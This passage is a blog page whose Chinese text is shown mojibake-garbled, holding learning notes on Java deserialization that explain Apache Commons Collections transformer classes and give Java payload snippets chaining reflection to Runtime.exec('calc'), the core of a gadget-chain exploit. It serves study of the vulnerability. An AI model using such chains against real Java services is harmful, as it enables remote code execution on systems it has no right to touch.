<!DOCTYPE html>
<html lang="en">

<!-- Head tag (contains Google-Analyticsã€Baidu-Tongji)-->
<head>
  <!-- Google Analytics -->
  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-V3C5GQ73TE"></script>
    <script type="text/javascript">
      window.dataLayer = window.dataLayer || [];

      function gtag() {
        dataLayer.push(arguments);
      }
      gtag('js', new Date());

      gtag('config', 'G-V3C5GQ73TE');
    </script>
  

  <!-- Baidu Tongji -->
  
    <script type="text/javascript">
      // Originial
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?x";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  <!-- Baidu Push -->
  
    <script>
      (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
      })();
    </script>
  

  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>

  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>

  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="description" content="Morouuçš„å¤§ç‹—çª â—&#39;â—¡&#39;â—"/>
  <meta name="keyword" content="Morouu,morouu"/>
  <link rel="shortcut icon" href="//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302341051.png"/>

  <!-- Place this tag in your head or just before your close body tag. -->
  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>

  
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css"/>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/beantech.min.css"/>

    <!-- Pygments Highlight CSS -->
    <link rel="stylesheet" href="/css/highlight.css"/>
    <link rel="stylesheet" href="/css/widget.css"/>
    <link rel="stylesheet" href="/css/rocket.css"/>
    <link rel="stylesheet" href="/css/signature.css"/>
    <link rel="stylesheet" href="/css/catalog.css"/>
    <link rel="stylesheet" href="/css/livemylife.css"/>

    
      <!-- wave start -->
      <link rel="stylesheet" href="/css/wave.css"/>
      <!-- wave end -->
    

    
      <!-- top start (article top hot config) -->
      <link rel="stylesheet" href="/css/top.css"/>
      <!-- top end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/scroll.css"/>
      <!-- ThemeColor end -->
    

    
      <!-- viewer start (Picture preview) -->
      <link rel="stylesheet" href="/css/viewer.min.css"/>
      <!-- viewer end -->
    

    
      <!-- Search start -->
      <link rel="stylesheet" href="/css/search.css"/>
      <!-- Search end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/themecolor.css"/>
      <!-- ThemeColor end -->
    

    

    
  

  <!-- Custom Fonts -->
  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
  <!-- Hux change font-awesome CDN to qiniu -->
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->

  <!-- ga & ba script hoook -->
  <link rel="canonical" href="https://morblog.cc/posts/320531414/">
  <title>
    
      å­¦ä¹ ç¬”è®° - javaååºåˆ—åŒ–(ä¸€) - Morouuçš„å¤§ç‹—çª â—&#39;â—¡&#39;â—
    
  </title>
<meta name="generator" content="Hexo 5.4.0"></head>


<!-- hack iOS CSS :active style -->

	<body ontouchstart="" class="body--light body--light">


		<!-- ThemeColor -->
		
		<!-- ThemeColor -->
<style type="text/css">
  .body--light {
    --light-mode: none;
    --dark-mode: block;
  }
  .body--dark {
    --light-mode: block;
    --dark-mode: none;
  }
  i.mdui-icon.material-icons.light-mode {
    display: var(--light-mode);
  }
  i.mdui-icon.material-icons.dark-mode {
    display: var(--dark-mode);
  }
</style>
<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
  <i class="mdui-icon material-icons light-mode">î†¬</i>
  <i class="mdui-icon material-icons dark-mode">î§</i>
</div>
<script>
  //getCookieValue
  function getCookieValue(a) {
    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
    return b
      ? b.pop()
      : '';
  }
  let themeMode = 'light';
  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
    let dbody = document.body.classList;
    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
  }

  //setCookieValue
  var toggleBtn = document.querySelector(".toggle");
  toggleBtn.addEventListener("click", function () {
    var e = document.body.classList.contains("body--dark");
    var cookieString = e
      ? "dark"
      : "light";
    var exp = new Date();
    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3å¤©è¿‡æœŸ
    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
  });
</script>

		

		<!-- Gitter -->
		
		<!-- Gitter -->
<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
<script>
  ((window.gitter = {}).chat = {}).options = {
    room: 'dmantick/morcruiser'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

		

		<!-- Navigation (contains search)-->
		<!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header page-scroll">
      <button type="button" class="navbar-toggle">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">Morouuçš„å¤§ç‹—çª â—&#39;â—¡&#39;â—</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
    <div id="huxblog_navbar">
      <div class="navbar-collapse">
        <ul class="nav navbar-nav navbar-right">
          <li>
            <a href="/">é¦–é¡µ</a>
          </li>

          
          
          
          
          <li>
            <a href="/about/">
              
              å…³äº
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/categories/">
              
              åˆ†ç±»
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/archive/">
              
              å½’æ¡£
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/tags/">
              
              æ ‡ç­¾
              
              
            </a>
          </li>
          
          

          
          <li>
            <a class="popup-trigger">
              <span class="search-icon"></span>æœç´¢</a>
          </li>
          

          <!-- LangSelect -->
          
          
          
          
          
        </ul>
      </div>
    </div>
    <!-- /.navbar-collapse -->
  </div>
  <!-- /.container -->
</nav>
<!-- progress -->
<div id="progress">
  <div class="line" style="width: 0%;"></div>
</div>

<script>
  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
  var $body = document.body;
  var $toggle = document.querySelector('.navbar-toggle');
  var $navbar = document.querySelector('#huxblog_navbar');
  var $collapse = document.querySelector('.navbar-collapse');

  $toggle.addEventListener('click', handleMagic)

  function handleMagic(e) {
    if ($navbar.className.indexOf('in') > 0) {
      // CLOSE
      $navbar.className = " ";
      // wait until animation end.
      setTimeout(function() {
        // prevent frequently toggle
        if ($navbar.className.indexOf('in') < 0) {
          $collapse.style.height = "0px"
        }
      }, 400)
    } else {
      // OPEN
      $collapse.style.height = "auto"
      $navbar.className += " in";
    }
  }
</script>


		<!-- Post Header (contains intro-headerã€signatureã€wordcountã€busuanziã€waveoverlay) -->
		<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->

  <style type="text/css">
    .body--light {
      /* intro-header */
      --intro-header-background-image-url-home: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }
    .body--dark {
      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }

    header.intro-header {
       /*post*/
        background-image: var(--intro-header-background-image-url-post);
        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
      
    }

    
      #signature {/*signature*/
        background-image: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302343273.png');
      }
    
  </style>





<header class="intro-header">
  <!-- Signature -->
  <div id="signature">
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
          
          <div class="post-heading">
            <div class="tags">
              
              <a class="tag" href="/tags/#å®‰å…¨" title="å®‰å…¨">å®‰å…¨</a>
              
              <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
              
              <a class="tag" href="/tags/#æ¼æ´" title="æ¼æ´">æ¼æ´</a>
              
              <a class="tag" href="/tags/#ååºåˆ—åŒ–" title="ååºåˆ—åŒ–">ååºåˆ—åŒ–</a>
              
            </div>
            <h1>å­¦ä¹ ç¬”è®° - javaååºåˆ—åŒ–(ä¸€)</h1>
            <h2 class="subheading"></h2>
            <span class="meta">
              Posted by morouu on
              2022-02-17
            </span>


            
            <!-- WordCount start -->
            <div class="blank_box"></div>
            <span class="meta">
              Estimated Reading Time <span class="post-count" >62</span> Minutes
            </span>
            <div class="blank_box"></div>
            <span class="meta">
              Words <span class="post-count">13.5k</span> In Total
            </span>
            <div class="blank_box"></div>
            <!-- WordCount end -->
            
            
            <!-- ä¸è’œå­ç»Ÿè®¡ start -->
            <span class="meta" id="busuanzi_container_page_pv">
              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
            </span>
            <!-- ä¸è’œå­ç»Ÿè®¡ end -->
            


          </div>
          
        </div>
      </div>
    </div>
  </div>

  
  <!-- waveoverlay start -->
  <div class="preview-overlay">
    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
      <defs>
        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
      </defs>
      <g class="preview-parallax">
        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
      </g>
    </svg>
  </div>
  <!-- waveoverlay end -->
  

</header>



		<!-- Main Content (Post contains
	Pagerã€
	tipã€
	socialshareã€
	gitalkã€gitmentã€disqus-commentã€
	Catalogã€
	Sidebarã€
	Featured-Tagsã€
	Friends Blogã€
	anchorjsã€
	) -->
		<!-- Modify by Yu-Hsuan Yen -->
<!-- Post Content -->
<article>
  <div class="container" style="margin-left: 10%;">
    <div class="row">
      <!-- Post Container -->
      <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">

        <h1 id="å­¦ä¹ ç¬”è®°-javaååºåˆ—åŒ–-ä¸€"><a href="#å­¦ä¹ ç¬”è®°-javaååºåˆ—åŒ–-ä¸€" class="headerlink" title="å­¦ä¹ ç¬”è®° - javaååºåˆ—åŒ–(ä¸€)"></a>å­¦ä¹ ç¬”è®° - javaååºåˆ—åŒ–(ä¸€)</h1><hr>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="- å‰è¨€ -"></a>- å‰è¨€ -</h2><p>å°±å½“ä½œæ˜¯å†™ç»™è‡ªå·±ä»¥åç¿»çœ‹çš„å­¦ä¹ ç¬”è®°å§ï¼Œå¦‚æœæœ‰é”™è¯¯æœ‰æœ›å„ä½å¸ˆå‚…ä¼™ä¼´ä»¬æŒ‡å‡ºäº†0.0ã€‚å¦å¤–ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–éƒ¨åˆ†éœ€è¦å­¦ä¹ (ä¸å¦‚è¯´æ˜¯æŠŠä¹‹å‰å¿˜æ‰çš„éƒ¨åˆ†é‡æ–°å¤ç°ä¸€é)ï¼Œå¾€åè¿˜ä¼šç»§ç»­ã€‚</p>
<h2 id="å‰ç½®å†…å®¹"><a href="#å‰ç½®å†…å®¹" class="headerlink" title="- å‰ç½®å†…å®¹ -"></a>- å‰ç½®å†…å®¹ -</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="- Transformer -"></a>- Transformer -</h3><p>è¿™ä¸ªç©æ„æ˜¯ä¸€ä¸ªæ¥è‡ª <code>commons.collections</code> çš„æ¥å£ï¼Œå…¶æ‹¥æœ‰å”¯ä¸€éœ€è¦å®ç°çš„æ–¹æ³• <code>transform</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150149976.png" alt="image-20220215014906831"></p>
<p>å…¶ä¸­ï¼Œå®ç°äº†è¯¥æ¥å£ä¸”æ¯”è¾ƒå…³é”®çš„ç±»ä¸ºä»¥ä¸‹ğŸ‘‡</p>
<ul>
<li><code>InvokerTransformer</code></li>
<li><code>ConstantTransformer</code></li>
<li><code>TransformedMap</code></li>
</ul>
<p>è¿™å‡ ä¸ªç±»éƒ½æ‹¥æœ‰ä¸åŒçš„ <code>transform</code> æ–¹æ³•ï¼Œå®ç°äº† <code>transformer</code> æ¥å£ï¼Œè€Œä¸”æ˜¯å¤§éƒ¨åˆ† <code>CCé“¾</code> çš„å…³é”®ã€‚</p>
<h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="- InvokerTransformer -"></a>- InvokerTransformer -</h5><p>é‚£ä¹ˆå…ˆæ¥çœ‹ <code>InvokerTransformer</code> è¿™ä¸ªç±»çš„ <code>transformer</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150159093.png" alt="image-20220215015911009"></p>
<p>å¯ä»¥çœ‹åˆ°å…¶ä¼šè·å–ä¼ å…¥çš„ <code>input</code> å‚æ•°ä¸­å‚æ•°ä¸º <code>this.iParamTypes</code> ï¼Œåç§°ä¸º <code>this.iMethodName</code> çš„æ–¹æ³•ï¼Œç„¶åä»¥ <code>this.iArgs</code> ä½œä¸ºå‚æ•°è¿›è¡Œè°ƒç”¨ã€‚</p>
<p>è€Œ <code>this.iMethodName</code> <code>this.iParamTypes</code> <code>this.iArgs</code> æ˜¯å¯ä»¥ä» <code>InvokerTransformer</code> ç±»çš„æ„é€ æ–¹æ³•ä¼ å…¥ï¼Œä¸” <code>InvokerTransformer</code> ç±»å¯åºåˆ—åŒ–ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150203164.png" alt="image-20220215020324053"></p>
<p>æ­¤æ—¶å°±å¯ä»¥è·å–ä¸€ä¸ªå¯¹ <code>ä»»æ„ç±»</code>  çš„ <code>ä»»æ„æ–¹æ³•</code> ä¼ å…¥ <code>ä»»æ„å‚æ•°</code> çš„è°ƒç”¨äº†ã€‚</p>
<h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="- ConstantTransformer -"></a>- ConstantTransformer -</h5><p>å†æ¥çœ‹ <code>ConstantTransformer</code> ç±»çš„ <code>transformer</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150205783.png" alt="image-20220215020511745"></p>
<p>ä»…æ˜¯å°†è‡ªèº«çš„ <code>this.iConstant</code> å±æ€§è¿”å›ï¼ŒåŒæ—¶å’Œ <code>InvokerTransformer</code> ç±»ä¸€æ ·ï¼Œ <code>ConstantTransformer</code> ç±»çš„ <code>this.iMethodName</code> å±æ€§æ˜¯å¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•æ§åˆ¶ä¸”å¯åºåˆ—åŒ–ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150207125.png" alt="image-20220215020712044"></p>
<p>è¿™æ„å‘³ç€å¯ä»¥é€šè¿‡ <code>ConstantTransformer</code> ç±»çš„ <code>transformer</code> è·å– <code>ä»»æ„å€¼</code> ã€‚</p>
<h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="- ChainedTransformer -"></a>- ChainedTransformer -</h5><p>è¿™ä¸ª <code>ChainedTransformer</code> ç±»æ¯”è¾ƒç‰¹æ®Šï¼Œä¸€èˆ¬ç”¨æ¥å¯¹ä¸Šé¢çš„ <code>InvokerTransformer</code> ç±»å’Œ <code>ConstantTransformer</code> åšä¸€ä¸ªæ‰§è¡Œé¡ºåºçš„åŒ…è£…ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150210351.png" alt="image-20220215021021246"></p>
<p>å¯ä»¥çœ‹åˆ° <code>ChainedTransformer</code> ç±»çš„ <code>transformer</code> æ–¹æ³•ä¼šå°†å…¶ <code>this.iTransformers</code> å±æ€§ä¸­æ¯ä¸€ä¸ª<code>Transformer</code> æ¥å£å…ƒç´ è¿›è¡Œ <code>transform</code> æ–¹æ³•çš„è°ƒç”¨ï¼›åœ¨é¦–æ¬¡ä½¿ç”¨ <code>object</code> å‚æ•°ä½œä¸ºè°ƒç”¨ <code>tranform</code> æ–¹æ³•çš„è°ƒç”¨å‚æ•°è¿›è¡Œè°ƒç”¨åï¼Œå°†é€šè¿‡è°ƒç”¨ <code>tranform</code> æ–¹æ³•å¾—åˆ°çš„ç»“æœä½œä¸ºä¸‹æ¬¡è°ƒç”¨ <code>tranform</code> æ–¹æ³•çš„å‚æ•°è¿›è¡Œè°ƒç”¨ã€‚</p>
<p>åŒæ—¶ <code>ChainedTransformer</code> ç±»çš„ <code>this.iTransformers</code> å±æ€§æ˜¯å¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•æ§åˆ¶ï¼Œè€Œ <code>ChainedTransformer</code> ä¹Ÿæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="- payload -"></a>- payload -</h4><p>é‚£ä¹ˆç”±ä¸Šé¢å‡ ä¸ªç±»å°±å¯ä»¥å¾ˆå®¹æ˜“çš„å¾—åˆ°ç®€å•çš„ <code>payload</code> äº†ï¼Œæ¯”å¦‚ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        InvokerTransformer itf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        itf.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±äº <code>Runtime</code> è¿™ä¸ªç±»å¹¶ä¸èƒ½åºåˆ—åŒ–ï¼Œä¸Šé¢çš„ <code>payload</code> å¹¶ä¸èƒ½ç”¨åœ¨ <code>ååºåˆ—åŒ–</code> ä¸Šï¼Œå†æ¥ä¸ª <code>ååºåˆ—åŒ–</code> çš„(<code>commons.collections3.2.0</code>)ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer ctf = <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">        ctf.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå¯ä»¥æ”¯æŒ <code>ååºåˆ—åŒ–</code> çš„ <code>payload</code> åŸå› æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹å…ˆåˆ©ç”¨ <code>ConstantTransformer</code> ç±»å°† <code>Runtime.class</code> è·å–äº†ï¼Œç„¶åä¸€æ­¥æ­¥ç”¨ <code>InvokerTransformer</code> æ‹¼è£…ç›´è‡³åˆ°å¯¹ <code>exec</code> çš„è°ƒç”¨ï¼›ä¹Ÿå°±æ˜¯è¿˜åŸäº† <code>java.lang.Runtime.getRuntime().exec()</code> çš„è°ƒç”¨è¿‡ç¨‹ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method m = Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Runtime r = (Runtime) m.invoke(<span class="keyword">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ï¼Œä»¥ä¸Š <code>payload</code> è§¦å‘çš„å…³é”®æ˜¯è°ƒç”¨äº† <code>transform</code> æ–¹æ³•ï¼Œå› æ­¤åœ¨ <code>ååºåˆ—åŒ–</code> æ—¶éœ€è¦é€šè¿‡åˆé€‚çš„æ–¹å¼è°ƒç”¨ <code>transform</code> æ‰å¯ä»¥è§¦å‘ï¼Œä¹Ÿå°±æ˜¯å¾—æ‰¾åˆ°ç±»ä¼¼ <code>[(Transformer)å¯æ§].transform()</code> çš„ç»“æ„ï¼Œè¿™å°±åˆ° <code>CCé“¾</code> çš„æ—¶å€™å†è¯´ç½¢ã€‚</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="- TemplatesImpl -"></a>- TemplatesImpl -</h3><p>åœ¨å¼€å§‹ä¹‹å‰å…ˆå›é¡¾ä¸€ä¸‹æœ‰å…³ç±»åˆå§‹åŒ–ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;in Test3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> <span class="keyword">extends</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">	&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;init 1&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;in Test2&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;init 3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Test2.class.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init <span class="number">2</span></span><br><span class="line">in Test3</span><br><span class="line">init <span class="number">1</span></span><br><span class="line">in Test2</span><br><span class="line">init <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>ç”±æ­¤å¯ä»¥å¾—åˆ°è¿™ä¸‰ä¸ªåˆå§‹åŒ–çš„é¡ºåºğŸ‘‡</p>
<ul>
